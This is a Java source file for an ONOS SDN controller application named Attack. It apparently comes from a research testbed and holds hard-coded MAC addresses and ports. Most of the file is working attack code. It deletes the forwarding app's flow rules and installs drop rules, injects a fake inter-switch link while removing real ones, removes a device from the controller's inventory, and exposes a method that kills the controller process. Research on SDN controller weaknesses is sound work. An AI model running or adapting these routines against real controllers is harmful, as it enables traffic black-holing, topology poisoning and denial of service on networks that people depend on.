/*
 * Copyright 2014 Open Networking Laboratory
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.onosproject.attack;

import com.fasterxml.jackson.databind.ext.CoreXMLSerializers;
import org.apache.felix.scr.annotations.Component;
import org.apache.felix.scr.annotations.Service;
import org.apache.felix.scr.annotations.Activate;
import org.apache.felix.scr.annotations.Deactivate;
import org.onlab.osgi.ServiceNotFoundException;
import org.onlab.packet.IpPrefix;
import org.onlab.packet.MacAddress;
import org.onosproject.core.ApplicationId;
import org.onosproject.core.CoreService;
import org.onosproject.net.PortNumber;
import org.onosproject.net.Device;
import org.onosproject.net.DefaultAnnotations;
import org.onosproject.net.DeviceId;
import org.onosproject.net.ConnectPoint;
import org.onosproject.net.device.DeviceDescription;
import org.onosproject.net.device.DeviceStore;
import org.onosproject.net.device.DeviceAdminService;
import org.onosproject.net.device.DeviceService;
import org.onosproject.net.device.DefaultDeviceDescription;
import org.onosproject.net.flow.DefaultTrafficSelector;
import org.onosproject.net.flow.DefaultTrafficTreatment;
import org.onosproject.net.flow.FlowRuleService;
import org.onosproject.net.flow.TrafficSelector;
import org.onosproject.net.flow.TrafficTreatment;
import org.onosproject.net.flowobjective.DefaultForwardingObjective;
import org.onosproject.net.flowobjective.FlowObjectiveService;
import org.onosproject.net.flowobjective.ForwardingObjective;
import org.onosproject.net.provider.ProviderId;
import org.osgi.framework.BundleContext;
import org.osgi.framework.FrameworkUtil;
import org.osgi.framework.ServiceReference;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.net.InetAddress;
import java.util.ArrayList;
import java.util.Set;

@Component(immediate = true)
@Service(value = Attack.class)
public class Attack {

    public ProviderId providerId;
    public DeviceId deviceId;
    public DeviceDescription deviceDescription;
    public DeviceId deviceIdone;
    public DeviceId deviceIdtwo;

    private final Logger log = LoggerFactory.getLogger(getClass());


    @Activate
    protected void activate() {
        log.info("Attack App Started");
    }

    @Deactivate
    protected void deactivate() {
        log.info("Attack App Stopped");
    }

    public void systemExit() {
        System.exit(1);
    }

    public static <T> T getService(Class<T> serviceClass) {
        BundleContext bc = FrameworkUtil.getBundle(serviceClass).getBundleContext();
        if (bc != null) {
            ServiceReference<T> reference = bc.getServiceReference(serviceClass);
            if (reference != null) {
                T impl = bc.getService(reference);
                if (impl != null) {
                    return impl;
                }
            }
        }
        throw new ServiceNotFoundException("Service " + serviceClass.getName() + " not found");
    }

    public void nbFlowRuleStart() {
        CoreService cs = getService(CoreService.class);
        ApplicationId appId = cs.getAppId("org.onosproject.fwd");
        FlowRuleService rs = getService(FlowRuleService.class);
        rs.getFlowRulesById(appId);
        rs.removeFlowRulesById(appId);

        FlowObjectiveService fs = getService(FlowObjectiveService.class);

        TrafficSelector selectorBuilder = DefaultTrafficSelector.builder()
                .matchEthSrc(MacAddress.valueOf("00:00:00:00:00:03"))
                .matchEthDst(MacAddress.valueOf("00:00:00:00:00:01"))
                .matchInPort(PortNumber.portNumber(3))
                .build();

        int flowPriority = 10;

        TrafficTreatment treatment = DefaultTrafficTreatment.builder()
                .drop()
                .build();

        ForwardingObjective forwardingObjective = DefaultForwardingObjective.builder()
                .withSelector(selectorBuilder)
                .withTreatment(treatment)
                .withPriority(flowPriority)
                .withFlag(ForwardingObjective.Flag.VERSATILE)
                .fromApp(appId)
                .makeTemporary(100)
                .add();
        fs.forward(deviceIdone, forwardingObjective);
    }

    public void nbFlowRuleStop() {
        CoreService cs = getService(CoreService.class);
        ApplicationId appId = cs.getAppId("org.onosproject.fwd");
        FlowRuleService rs = getService(FlowRuleService.class);
        rs.getFlowRulesById(appId);
        rs.removeFlowRulesById(appId);

    }
    public void sbLinkProviderStart() {
        CoreService cs = getService(CoreService.class);
        ApplicationId appId = cs.getAppId("org.onosproject.fwd");
        FlowRuleService rs = getService(FlowRuleService.class);
        rs.getFlowRulesById(appId);
        rs.removeFlowRulesById(appId);

        AttackProvider attackProvider = getService(AttackProvider.class);

        int fakesrc = 5;
        int fakedst = 7;
        int src = 3;
        int dst = 3;
        ConnectPoint realsrc = new ConnectPoint(deviceIdone, PortNumber.portNumber(src));
        ConnectPoint realdst = new ConnectPoint(deviceIdone, PortNumber.portNumber(dst));
        attackProvider.removeattack(realsrc);
        attackProvider.removeattack(realdst);

        ConnectPoint fakesrcCp = new ConnectPoint(deviceIdone, PortNumber.portNumber(fakesrc));
        ConnectPoint fakedstCp = new ConnectPoint(deviceIdtwo, PortNumber.portNumber(fakedst));
        attackProvider.addattack(fakesrcCp, fakedstCp);

        attackProvider.removeattack(realsrc);
        attackProvider.removeattack(realdst);
    }

    public void deviceRemoveAttackStart() {
        CoreService cs = getService(CoreService.class);
        ApplicationId appId = cs.getAppId("org.onosproject.fwd");
        FlowRuleService rs = getService(FlowRuleService.class);
        rs.getFlowRulesById(appId);
        rs.removeFlowRulesById(appId);

        DeviceAdminService deviceAdminService = getService(DeviceAdminService.class);
        DeviceService deviceService = getService(DeviceService.class);
        int i = 0;
        Iterable<Device> devices = deviceService.getDevices();
        for (Device device : devices) {
            if (i == 0) {
                deviceIdone = device.id();
            } else if (i == 1) {
                deviceIdtwo = device.id();
            } else {
                break;
            }
            i++;
        }
        for (Device device : devices) {
            deviceAdminService.removeDevice(device.id());
            storeDevice(device);
            break;
        }
    }

    public void deviceRemoveAttackStop() {
        CoreService cs = getService(CoreService.class);
        ApplicationId appId = cs.getAppId("org.onosproject.fwd");
        FlowRuleService rs = getService(FlowRuleService.class);
        rs.getFlowRulesById(appId);
        rs.removeFlowRulesById(appId);

        DeviceStore deviceStore = getService(DeviceStore.class);
        deviceStore.createOrUpdateDevice(providerId, deviceId, deviceDescription);
    }

    public void storeDevice(Device device) {
        providerId = device.providerId();
        deviceId = device.id();
        Set<String> keys = device.annotations().keys();
        ArrayList<String> values = new ArrayList<>();
        ArrayList<String> keySet = new ArrayList<>();

        for (String key : keys) {
            values.add(device.annotations().value(key));
            keySet.add(key);
        }

        DefaultAnnotations attributes = DefaultAnnotations.builder()
                .set(keySet.get(0), values.get(0))
                .set(keySet.get(1), values.get(1))
                .set(keySet.get(2), values.get(2))
                .build();

        DeviceDescription removedDescription =
                new DefaultDeviceDescription(device.id().uri(),
                        device.type(),
                        device.manufacturer(),
                        device.hwVersion(),
                        device.swVersion(),
                        device.serialNumber(),
                        device.chassisId(),
                        attributes);
        deviceDescription = removedDescription;
    }
}